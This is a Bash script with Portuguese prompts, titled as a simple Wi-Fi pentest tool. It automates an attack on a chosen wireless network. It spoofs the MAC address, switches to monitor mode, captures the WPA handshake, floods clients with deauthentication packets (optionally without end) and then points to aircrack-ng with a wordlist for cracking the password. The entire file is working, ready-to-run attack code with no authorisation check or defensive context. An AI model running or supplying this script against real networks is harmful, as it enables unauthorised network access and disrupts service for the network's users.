#!/bin/bash

clear
echo "===== PENTEST WI-FI SIMPLES ====="
echo ""

# Lista interfaces de rede
echo "[+] Interfaces disponíveis:"
ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
echo ""
read -p "Digite o nome da interface (ex: wlan0): " INTERFACE

# Verifica se a interface existe
if ! ip link show $INTERFACE &> /dev/null; then
    echo "[ERRO] Interface $INTERFACE não encontrada!"
    exit 1
fi

# Passo 1: Mudar MAC e ativar modo monitor
echo ""
echo "[+] Mudando MAC e ativando modo monitor..."
sudo ifconfig $INTERFACE down
sudo macchanger -r $INTERFACE &> /dev/null
sudo ifconfig $INTERFACE up
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start $INTERFACE &> /dev/null
INTERFACE_MON="${INTERFACE}mon"

# Passo 2: Listar redes
echo ""
echo "[+] Listando redes próximas (Ctrl+C para parar)..."
sudo airodump-ng $INTERFACE_MON
echo ""
read -p "Digite o BSSID (MAC) do alvo: " BSSID
read -p "Digite o canal do alvo: " CHANNEL
read -p "Digite o nome do arquivo de captura (sem extensão): " FILE_NAME

# Passo 3: Capturar handshake
echo ""
echo "[+] Capturando handshake (abra outro terminal para o próximo passo)..."
sudo airodump-ng --bssid $BSSID -c $CHANNEL -w $FILE_NAME $INTERFACE_MON &> /dev/null &

# Passo 4: Ataque de desautenticação
echo ""
read -p "Quantos pacotes de desautenticação? (0 para contínuo): " PACKETS
echo "[+] Iniciando ataque de desautenticação..."
sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE_MON

# Finalização
echo ""
echo "[+] Concluído! Handshake salvo em: ${FILE_NAME}.cap"
echo "Use 'aircrack-ng -w wordlist.txt ${FILE_NAME}.cap' para quebrar a senha."

# Limpeza
sudo airmon-ng stop $INTERFACE_MON &> /dev/null
sudo ifconfig $INTERFACE down
sudo macchanger -p $INTERFACE &> /dev/null
sudo ifconfig $INTERFACE up
